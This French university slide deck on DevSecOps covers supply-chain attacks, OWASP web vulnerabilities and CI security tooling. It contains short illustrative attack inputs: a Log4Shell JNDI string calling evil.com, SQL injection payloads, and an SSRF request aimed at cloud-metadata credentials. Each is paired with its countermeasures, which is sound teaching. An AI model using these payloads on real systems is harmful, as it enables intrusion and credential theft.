---
theme: seriph
background: https://cover.sli.dev
class: text-center
highlighter: shiki
lineNumbers: true
info: |
  ## Cours 6 — Vers le DevSecOps : Attaques & Contre-mesures
  Université de Rennes · IRISA · DiverSE
  Olivier Barais
drawings:
  persist: false
transition: slide-left
title: "Cours 6 — DevSecOps : Attaques & Contre-mesures"
mdc: true
---

# Vers le DevSecOps  
# Attaques & Contre-mesures

**DevSecOps 2026** · Cours 6

<div class="pt-8 text-gray-400">
  Olivier Barais — Université de Rennes / IRISA
</div>

---
layout: default
---

# Plan du cours

<div class="grid grid-cols-2 gap-6 mt-10">
<div class="border border-blue-400/40 rounded-xl p-6 bg-blue-900/10">
  <div class="text-3xl font-bold text-blue-300">1 · DevSecOps</div>
  <div class="text-base text-gray-400 mt-2">Définition et culture de la sécurité dans le flux</div>
</div>
<div class="border border-red-400/40 rounded-xl p-6 bg-red-900/10">
  <div class="text-3xl font-bold text-red-300">2 · Supply Chain</div>
  <div class="text-base text-gray-400 mt-2">Les attaques sur la chaîne logicielle</div>
</div>
<div class="border border-yellow-400/40 rounded-xl p-6 bg-yellow-900/10">
  <div class="text-3xl font-bold text-yellow-300">3 · Applications Web</div>
  <div class="text-base text-gray-400 mt-2">Les vulnérabilités classiques (OWASP)</div>
</div>
<div class="border border-green-400/40 rounded-xl p-6 bg-green-900/10">
  <div class="text-3xl font-bold text-green-300">4 · Contre-mesures</div>
  <div class="text-base text-gray-400 mt-2">Automatiser la sécurité dans la CI</div>
</div>
</div>

---
layout: section
---

# 1. DevSecOps — Définition et culture

---

# DevSecOps : intégrer la sécurité dans le flux

<div class="grid grid-cols-2 gap-6 mt-2">
<div>

**DevOps** réunit Dev et Ops pour accélérer la livraison.  
**DevSecOps** y intègre la sécurité **dès le début**, pas en fin de cycle.

**Les trois piliers :**

- **Rapprocher la sécurité du développement** — les développeurs sont les premiers responsables de la sécurité du code
- **Automatisation** — la sécurité ne peut pas ralentir les déploiements : elle s'automatise
- **Sécurité à chaque phase** — de la conception au monitoring en production

</div>
<div class="text-center">

<img src="/devsecops-loop.png" class="mx-auto h-52 rounded shadow" />

</div>
</div>

---

# La boucle DevSecOps

<div class="text-center mb-4">
  <img src="/devsecops-tools.png" class="mx-auto h-56 rounded shadow" />
</div>

<div class="grid grid-cols-2 gap-4 text-sm">
<div>

**Phase Dev :**
- **Code** — Secure coding, Security as Code
- **Build** — SAST (analyse statique)
- **Test** — DAST, Pen Test, Digital Sign

</div>
<div>

**Phase Ops :**
- **Deploy** — Secure Transfer, Security Config, Security Scan
- **Operate** — Security Patch
- **Monitor** — Security Analysis, Security Monitor, Security Audit

</div>
</div>

---

# Construire une culture de la sécurité

**Pourquoi ?** En tant que RSSI, vous gérerez un SI composé d'applicatifs propriétaires **et** open source en perpétuelle évolution. Les développeurs, les environnements et les dépendances changent en permanence.

<div class="grid grid-cols-2 gap-6 mt-4">
<div>

**Programme Security Champion**
- Un développeur référent sécurité par équipe
- Réunions régulières sur les efforts de développement
- Communique et accélère les initiatives de sécurité
- Pont entre l'équipe sécurité et les devs

</div>
<div>

**Procédures manuelles complémentaires**
- Revue de code sur le code sensible
- Sécurité impliquée dans les discussions d'architecture
- Examen avant chaque release majeure
- Threat modeling avec l'architecte

</div>
</div>

---

# Intégrer la sécurité dans les outils existants

**Principe :** utiliser les outils que les développeurs connaissent déjà — GitHub, GitLab, CI/CD — pour intégrer la sécurité sans friction.

```
  Code push
     │
     ├── 🔍 Analyse statique (SAST) ──── Bandit, Semgrep, CodeQL
     ├── 🔑 Détection de secrets ─────── Gitleaks, truffleHog  
     ├── 📦 Audit des dépendances ─────── pip-audit, npm audit, Dependabot
     ├── 🐳 Scan image Docker ─────────── Trivy, Grype
     └── 📋 Génération SBOM ───────────── Syft, cdxgen
```

**Collecte de métriques** : tableau de bord automatisé sur les vulnérabilités ouvertes, le temps moyen de correction, la dette de sécurité par équipe.

---
layout: section
---

# 2. Attaques sur la Supply Chain

---

# La réalité de l'open source

<div class="grid grid-cols-2 gap-6 mt-4">
<div>

> *"Open source software is pervasive in data centers, consumer devices, and applications. Securing open source supply chains requires a combination of automated tooling, best practices, education, and community collaboration."*  
> — CISA Open Source Software Security Roadmap, 2023

**ENISA Foresight 2030** prédit que les attaques sur la supply chain logicielle figureront parmi les menaces cybersécurité les plus importantes pour la prochaine décennie.

</div>
<div class="text-center">

<img src="/xkcd-dependency.png" class="mx-auto h-56 rounded" />
<div class="text-xs text-gray-500 mt-1">xkcd.com/2347 — "Dependency"</div>

</div>
</div>

---

# SolarWinds (2020) — Compromission du build

**Faits :**
- Décembre 2020 : Backdoor dans SolarWinds Orion, 18 000 organisations touchées, dont les ministères américains
- Attribuée au groupe APT29 (Cozy Bear, lié à la Russie)

**Comment ?**
```
  Code source SolarWinds (propre)
      │
      ▼
  Build system compromis (Orion Build System)
      │  ← Injection de SUNBURST ici
      ▼
  Binaire Orion signé avec le certificat SolarWinds
      │
      ▼
  Distribution via le canal de mise à jour officiel → 18 000 clients
```

> **Leçon :** Un code source propre ne suffit pas — le *build system* lui-même peut être compromis.

---

# Log4Shell (CVE-2021-44228)

**La vulnérabilité :**
```java
// Log4j 2.x — un simple log peut exécuter du code distant
logger.info("User login: " + username);
// Si username = "${jndi:ldap://evil.com/exploit}"
// → Log4j résout l'expression → connexion LDAP → RCE
```

**Impact :**
- CVSS Score : **10.0 / 10** (maximum)
- Présent dans **72%** des environnements Java
- Milliers d'applications touchées : VMware, Apple, Twitter, Steam…

**Leçon supply chain :**
- Une bibliothèque de logging "anodine" présente dans quasi tout l'écosystème Java
- **Dépendance transitive** : personne ne savait qu'il l'utilisait
- Sans SBOM, impossible de savoir qui est touché

---

# XZ Utils (CVE-2024-3094) — L'attaque la plus sophistiquée

**Timeline :**
- 2021 : Un acteur ("Jia Tan") commence à contribuer à xz-utils (outil Linux de compression)
- 2 ans de contributions légitimes, construction de la confiance
- 2024 : Devient co-mainteneur
- Mars 2024 : Injection d'une backdoor dans xz 5.6.0 et 5.6.1

**La backdoor :**
- Ciblait exclusivement OpenSSH sur systèmes x86-64 Linux
- Permettait l'exécution de code arbitraire **avant** l'authentification SSH
- Découverte par hasard par un ingénieur Microsoft : performance SSH anormale

> **Leçon :** Un attaquant patient peut infiltrer un projet open source pendant des années.  
> La confiance dans un mainteneur se construit, et peut être manipulée.

---

# left-pad (2016) — Dépendance à l'extrême

**L'événement :**
- Mars 2016 : Azer Koçulu retire ses ~270 paquets npm suite à un conflit légal
- Parmi eux : `left-pad` — 11 lignes de code
- Résultat : des milliers de builds brisés dans le monde (React, Babel…)

```javascript
// La bibliothèque "left-pad" en entier
module.exports = leftpad;
function leftpad(str, len, ch) {
  str = String(str);
  var i = -1;
  if (!ch && ch !== 0) ch = ' ';
  len = len - str.length;
  while (++i < len) str = ch + str;
  return str;
}
```

> **Leçon :** La *disponibilité* d'une dépendance n'est pas garantie.  
> La granularité excessive des paquets crée une fragilité systémique.

---

# Vecteurs d'attaque sur la supply chain

```
  ┌─────────────────────────────────────────────────────┐
  │             SUPPLY CHAIN ATTACK VECTORS              │
  ├─────────────────────────────────────────────────────┤
  │                                                     │
  │  A1  Compromission du compte d'un développeur       │
  │  A2  Typosquatting / Confusion de dépendances       │
  │  A3  Injection dans le code source (contributeur)   │
  │  A4  Compromission du build system                  │
  │  A5  Compromission du registre de paquets           │
  │  A6  Injection dans une dépendance open source      │
  │  A7  Compromission du canal de distribution         │
  │  A8  Code malveillant dans une image Docker         │
  │                                                     │
  └─────────────────────────────────────────────────────┘
```

Référence : [SAP Risk Explorer for Software Supply Chains](https://sap.github.io/risk-explorer-for-software-supply-chains/)

---
layout: section
---

# 3. Vulnérabilités des applications Web

---
zoom: 0.75
---

# OWASP Top 10 — Les failles les plus classiques

**OWASP** (Open Web Application Security Project) publie la liste des 10 risques les plus critiques pour les applications web.

| # | Catégorie | Exemples |
|---|-----------|---------|
| A01 | Broken Access Control | IDOR, privilege escalation |
| A02 | Cryptographic Failures | données en clair, MD5, DES |
| **A03** | **Injection** | **SQL, Shell, LDAP, XSS** |
| A04 | Insecure Design | absence de threat modeling |
| A05 | Security Misconfiguration | ports ouverts, secrets en dur |
| A06 | Vulnerable Components | Log4Shell, OpenSSL |
| A07 | Auth Failures | sessions non invalidées |
| A08 | Software Integrity Failures | SolarWinds, XZ Utils |
| A09 | Logging Failures | pas de traces d'attaque |
| A10 | SSRF | accès aux ressources internes |

---

# Injection SQL (SQLi)

<div class="grid grid-cols-2 gap-4 mt-2">
<div>

**Principe :** Injection de code SQL dans une requête via les entrées utilisateur.

```sql
-- Requête légitime
SELECT uid FROM Users 
WHERE name='Dupont'
  AND password='hash';

-- Avec nom = "Dupont';--"
SELECT uid FROM Users
WHERE name='Dupont';
--' AND password='foo';
-- ↑ Le reste est commenté !

-- Avec password = "' or 1;--"
SELECT uid FROM Users
WHERE name='Dupont'
  AND password='' or 1;
-- ↑ Toujours vrai !
```

</div>
<div class="text-center">

<img src="/sqli-attack.png" class="mx-auto h-56 rounded shadow" />

</div>
</div>

---

# Protection contre SQLi

**Contremesures :**

```python
# ❌ Requête construite par concaténation
query = "SELECT * FROM users WHERE name='" + username + "'"
cursor.execute(query)

# ✅ Requête préparée (paramétrisée)
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (username,))

# ✅ Avec un ORM (SQLAlchemy, Django ORM…)
user = User.objects.filter(name=username).first()
# L'ORM prépare automatiquement la requête
```

**Règles d'or :**
- Toujours utiliser des requêtes préparées ou un ORM
- Échapper les caractères spéciaux (`'`, `"`, `;`, `--`, `/*`)
- Principe du moindre privilège sur le compte DB
- Valider et filtrer toutes les entrées côté serveur

---

# Injection Shell — Un exemple réel

<div class="text-center">
  <img src="/shell-injection-code.png" class="mx-auto h-84 rounded shadow" />
</div>

<div class="text-sm mt-2 text-orange-600">

> Ce code Flask contient : injection shell (`commands.getstatusoutput('ls ' + path)`), clé MD5 codée en dur, DES avec IV nul, répertoire `/tmp/`...  
> Un vrai exemple de ce qu'un audit SAST (Bandit) détecterait immédiatement.

</div>

---
zoom: 0.95
---

# XSS — Cross-Site Scripting

<div class="text-center">
  <img src="/xss-attack.png" class="mx-auto h-60 rounded shadow" />
</div>

**Types :**
- **Stored XSS** — le script est stocké en base et servi à toutes les victimes (comme le diagramme ci-dessus)
- **Reflected XSS** — le script est dans l'URL et exécuté immédiatement
- **DOM-based XSS** — manipulation du DOM côté client

**Protection :** validation, échappement (`htmlspecialchars`), CSP, et les frameworks modernes (React, Angular, Vue) échappent par défaut.

---

# CSRF — Cross-Site Request Forgery

<div class="text-center">
  <img src="/csrf-attack.png" class="mx-auto h-64 rounded shadow" />
</div>

**Principe :** Faire exécuter une action à un utilisateur authentifié à son insu, en lui faisant visiter une page piégée.

**Protection :** Token CSRF (synchronizer token pattern), vérification de l'en-tête `Origin`/`Referer`, `SameSite=Strict` sur les cookies.

---

# SSRF — Server-Side Request Forgery

<div class="grid grid-cols-2 gap-4 mt-2">
<div>

**Principe :** Forcer le serveur à effectuer des requêtes vers des ressources auxquelles l'attaquant ne peut pas accéder directement.

**Cibles typiques :**
- Métadonnées cloud (`169.254.169.254`)
- Services internes (`redis://localhost:6379`)
- Ressources intranet non exposées

**Exemple :**
```
GET /fetch?url=http://169.254.169.254/
  latest/meta-data/iam/security-credentials/
```

**Protection :** validation stricte des URLs, liste blanche de domaines, blocage des adresses privées RFC1918.

</div>
<div class="text-center">

<img src="/ssrf-attack.png" class="mx-auto h-52 rounded shadow" />

</div>
</div>

---
layout: section
---

# 4. Contre-mesures & Automatisation

---

# Contre-mesure 1 : Le pinning de dépendances

**Problème :** `npm install express` peut installer n'importe quelle version compatible.

```json
// package.json — déclaration permissive
{ "dependencies": { "express": "^4.18.0" } }

// package-lock.json — version exacte pinnée + hash d'intégrité
{
  "node_modules/express": {
    "version": "4.18.2",
    "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
    "integrity": "sha512-5/PsL6iGOs..."
  }
}
```

**Bonnes pratiques :**
- Toujours committer `package-lock.json` / `poetry.lock` / `Cargo.lock`
- Utiliser `npm ci` (pas `npm install`) en CI → utilise exactement le lock file
- Vérifier l'intégrité par hash (SHA-512 dans le lock file)

---

# Contre-mesure 2 : SAST avec Bandit

**Bandit** est un SAST open source pour Python, développé par OpenStack Security. Il détecte les problèmes de sécurité via des règles prédéfinies sur l'AST du code.

```bash
# Installation et usage
pip install bandit
bandit -r src/                    # analyse récursive
bandit -r src/ -l                 # seulement les sévérités élevées
bandit sql_statements.py          # fichier unique

# Exemple de sortie Bandit :
>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection
   Severity: Medium   Confidence: Medium
   Location: app.py:12
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html

>> Issue: [B303:use_of_md5] Use of MD5 message digest
   Severity: Medium   Confidence: High
```

**Règles clés :** B101 (assert), B201 (Flask debug=True), B303 (MD5), B501 (SSL vérification), B602 (subprocess shell=True), B608 (SQL injection)

---

# Contre-mesure 3 : Détection de secrets avec Gitleaks

**Gitleaks** analyse l'historique git pour détecter les secrets codés en dur (clés API, mots de passe, tokens, certificats).

```bash
# Scanner le dépôt courant
gitleaks detect --source .

# Scanner l'historique git complet
gitleaks detect --source . --log-opts="--all"

# En pre-commit hook
gitleaks protect --staged

# Exemple de résultat :
Finding:  RANDOM_KEY = md5.new("@85ZMVsBnTYu060K7gf...").digest()
Secret:   @85ZMVsBnTYu060K7gf...
RuleID:   generic-api-key
File:     app.py
Line:     8
Commit:   a3f9d12...
```

> **Important :** Un secret commité dans git reste dans l'historique même après suppression. Il faut considérer le secret comme compromis et le révoquer immédiatement.

---
zoom: 0.75
---

# Contre-mesure 4 : Outils d'analyse dans la CI

```yaml
# .github/workflows/security.yml
name: Security Checks
on: [push, pull_request]

jobs:
  sast:
    name: Analyse statique (SAST)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Semgrep
        uses: semgrep/semgrep-action@v1

  dependency-audit:
    name: Audit des dépendances
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install pip-audit
      - run: pip-audit -r requirements.txt --format json -o audit.json

  secret-scan:
    name: Détection de secrets
    steps:
      - uses: gitleaks/gitleaks-action@v2

  container-scan:
    name: Scan image Docker
    steps:
      - uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'mon-app:${{ github.sha }}'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'
```

---
zoom: 0.9
---

# Contre-mesure 5 : Génération de SBOM

**SBOM = Software Bill of Materials**  
*La liste d'ingrédients de votre logiciel.*

```bash
# Générer un SBOM avec Syft
syft mon-app:latest -o cyclonedx-json > sbom.json

# Générer depuis les sources Python
cdxgen -t python -o sbom.json

# Analyser le SBOM avec Grype (vulnérabilités)
grype sbom:sbom.json

# Dans le pipeline CI
- name: Générer SBOM
  uses: anchore/sbom-action@v0
  with:
    image: mon-app:${{ github.sha }}
    format: cyclonedx-json
    output-file: sbom.json
    
- name: Scanner le SBOM
  uses: anchore/scan-action@v3
  with:
    sbom: sbom.json
    fail-build: true
    severity-cutoff: high
```

---
zoom: 0.9
---

# Le format CycloneDX

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.6",
  "version": 1,
  "metadata": {
    "component": {
      "type": "application",
      "name": "mon-app",
      "version": "2.1.0"
    }
  },
  "components": [
    {
      "type": "library",
      "name": "requests",
      "version": "2.31.0",
      "purl": "pkg:pypi/requests@2.31.0",
      "licenses": [{ "license": { "id": "Apache-2.0" } }],
      "hashes": [
        { "alg": "SHA-256", "content": "58cd2187..." }
      ]
    }
  ],
  "vulnerabilities": [ "..." ]
}
```

---
zoom: 0.9
---

# Contre-mesure 6 : SLSA Framework

**SLSA** = Supply chain Levels for Software Artifacts  
Cadre de niveaux de maturité de la sécurité supply chain (Google/OpenSSF)

| Niveau | Exigences |
|--------|-----------|
| **L0** | Aucune garantie |
| **L1** | Provenance documentée (build script, dépendances) |
| **L2** | Provenance signée (clé cryptographique) |
| **L3** | Build reproducible sur infrastructure vérifiée |
| **L4** | Build reproductible + revue de code multi-parties |

**En pratique — SLSA L2 avec GitHub Actions :**
```yaml
- uses: actions/attest-build-provenance@v1
  with:
    subject-name: ghcr.io/${{ github.repository }}
    subject-digest: ${{ steps.build.outputs.digest }}
```

**Objectif :** Rendre la compromission du pipeline *détectable et traçable*.

<style>
/* style.css */
.slidev-layout.two-cols-header {
  grid-template-columns: 4fr 2fr;
}
td {
  font-size: 0.9em;
  padding:0.1em;
  margin-top: 0em;
  margin-bottom: 0em;
}
</style>


---
layout: center
class: text-center
---

# À retenir

<div class="grid grid-cols-3 gap-5 mt-10">
<div class="border border-purple-400/40 rounded-xl p-6 bg-purple-900/10">
  <div class="text-4xl">🔒</div>
  <div class="font-bold text-xl text-purple-300 mt-3">Pas à la fin</div>
  <div class="text-base text-gray-400 mt-2">Intégrer la sécurité à <b>chaque étape</b> du pipeline</div>
</div>
<div class="border border-cyan-400/40 rounded-xl p-6 bg-cyan-900/10">
  <div class="text-4xl">🔗</div>
  <div class="font-bold text-xl text-cyan-300 mt-3">Confiance implicite</div>
  <div class="text-base text-gray-400 mt-2">Exploitée via build, dépendances &amp; mainteneurs</div>
</div>
<div class="border border-green-400/40 rounded-xl p-6 bg-green-900/10">
  <div class="text-4xl">⬅️</div>
  <div class="font-bold text-xl text-green-300 mt-3">Shift Left</div>
  <div class="text-base text-gray-400 mt-2">Détecter les problèmes le plus tôt possible</div>
</div>
</div>

<div class="mt-12 flex items-center justify-center flex-wrap gap-2 text-base">
  <span class="px-5 py-2 rounded-full bg-amber-400/15 border border-amber-400/40 text-amber-300 font-medium">SAST</span>
  <span class="text-gray-500">→</span>
  <span class="px-5 py-2 rounded-full bg-amber-400/15 border border-amber-400/40 text-amber-300 font-medium">Audit deps</span>
  <span class="text-gray-500">→</span>
  <span class="px-5 py-2 rounded-full bg-amber-400/15 border border-amber-400/40 text-amber-300 font-medium">SBOM</span>
  <span class="text-gray-500">→</span>
  <span class="px-5 py-2 rounded-full bg-amber-400/15 border border-amber-400/40 text-amber-300 font-medium">Scan image</span>
  <span class="text-gray-500">→</span>
  <span class="px-5 py-2 rounded-full bg-amber-400/15 border border-amber-400/40 text-amber-300 font-medium">Signature</span>
</div>

<div class="mt-6 text-sm text-gray-500">… puis on recommence — en boucle, à chaque livraison.</div>

---
layout: default
---

# Merci

<div class="text-2xl text-black mt-2 text-center">Questions ?</div>

<div class="mt-6 mb-4 text-xs uppercase tracking-widest text-black/60 text-center">Ressources pour aller plus loin</div>

<div class="grid grid-cols-2 gap-4">
<a href="https://owasp.org/www-project-top-10-ci-cd-security-risks/" target="_blank" class="border border-blue-400/60 rounded-xl p-4 bg-blue-100/70 hover:bg-blue-200/70 flex items-center gap-3">
  <span class="text-2xl">🔐</span>
  <span class="text-left leading-tight"><span class="block font-semibold text-black">OWASP Top 10 CI/CD</span><span class="block text-xs text-gray-700">owasp.org</span></span>
</a>
<a href="https://slsa.dev/" target="_blank" class="border border-cyan-400/60 rounded-xl p-4 bg-cyan-100/70 hover:bg-cyan-200/70 flex items-center gap-3">
  <span class="text-2xl">📦</span>
  <span class="text-left leading-tight"><span class="block font-semibold text-black">SLSA Framework</span><span class="block text-xs text-gray-700">slsa.dev</span></span>
</a>
<a href="https://cyclonedx.org/" target="_blank" class="border border-emerald-400/60 rounded-xl p-4 bg-emerald-100/70 hover:bg-emerald-200/70 flex items-center gap-3">
  <span class="text-2xl">🧾</span>
  <span class="text-left leading-tight"><span class="block font-semibold text-black">CycloneDX</span><span class="block text-xs text-gray-700">cyclonedx.org</span></span>
</a>
<a href="https://sap.github.io/risk-explorer-for-software-supply-chains/" target="_blank" class="border border-amber-400/60 rounded-xl p-4 bg-amber-100/70 hover:bg-amber-200/70 flex items-center gap-3">
  <span class="text-2xl">🗺️</span>
  <span class="text-left leading-tight"><span class="block font-semibold text-black">SAP Risk Explorer</span><span class="block text-xs text-gray-700">sap.github.io</span></span>
</a>
<a href="https://bandit.readthedocs.io/" target="_blank" class="border border-violet-400/60 rounded-xl p-4 bg-violet-100/70 hover:bg-violet-200/70 flex items-center gap-3">
  <span class="text-2xl">🐍</span>
  <span class="text-left leading-tight"><span class="block font-semibold text-black">Bandit — Python SAST</span><span class="block text-xs text-gray-700">bandit.readthedocs.io</span></span>
</a>
<a href="https://gitleaks.io/" target="_blank" class="border border-rose-400/60 rounded-xl p-4 bg-rose-100/70 hover:bg-rose-200/70 flex items-center gap-3">
  <span class="text-2xl">🔍</span>
  <span class="text-left leading-tight"><span class="block font-semibold text-black">Gitleaks</span><span class="block text-xs text-gray-700">gitleaks.io</span></span>
</a>
<a href="https://www.cisa.gov/sites/default/files/2023-09/CISA-Open-Source-Software-Security-Roadmap-508c.pdf" target="_blank" class="col-span-2 border border-slate-400/60 rounded-xl p-4 bg-slate-200/70 hover:bg-slate-300/70 flex items-center gap-3">
  <span class="text-2xl">🏛️</span>
  <span class="text-left leading-tight"><span class="block font-semibold text-black">CISA Open Source Software Security Roadmap</span><span class="block text-xs text-gray-700">cisa.gov · PDF</span></span>
</a>
</div>

<style scoped>
h1 { color: #000; }
</style>
